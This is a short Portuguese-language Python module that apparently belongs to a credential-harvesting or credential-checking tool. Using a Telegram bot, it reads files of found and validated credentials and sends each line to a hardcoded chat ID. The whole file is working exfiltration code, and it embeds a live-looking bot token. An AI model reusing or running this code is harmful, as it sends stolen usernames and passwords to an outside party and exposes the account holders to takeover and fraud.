import telepot
import json
def send_message(arq):

    bot = telepot.Bot("1083842647:AAENFt1rrrX_Uruc3nuKPJbQAFT092erevY")
    info_messages = bot.getUpdates()
    user = info_messages[0].get("message").get("from").get("username")
    #print(user)
    credentials = open('txt/'+arq)

    if user:
        if arq == 'senhas.txt':
            print("\033[1;35m╠═══════════════════════════════════════════════════════════╣")
            print("\033[1;35m║              \033[1;33mEnviando credenciais encontradas!            \033[1;35m║")
            print("\033[1;35m╠═══════════════════════════════════════════════════════════╣")

        #id_user = info_messages[0].get("message").get("from").get("id")
            creds = credentials.readlines()
            bot.sendMessage(754162730, "CREDENCIAIS ENCONTRADAS PARA VALIDAÇÂO:")
            for cred in creds:
                bot.sendMessage(754162730,cred)
        elif arq == 'creds.txt':
            print("\033[1;35m╠═══════════════════════════════════════════════════════════╣")
            print("\033[1;35m║               \033[1;33mEnviando credenciais válidas!               \033[1;35m║")
            print("\033[1;35m╚═══════════════════════════════════════════════════════════╝")
            creds = credentials.readlines()
            bot.sendMessage(754162730, "CREDENCIAIS VÁLIDAS")
            for cred in creds:
                bot.sendMessage(754162730,cred)
        else:
            print("\033[31;1m╠═══════════════════════════════════════════════════════════╣")
            print("\033[31;1m║                     \033[1;33mAlgum erro ocorreu                    \033[31;1m║")
            print("\033[31;1m╠═══════════════════════════════════════════════════════════╣")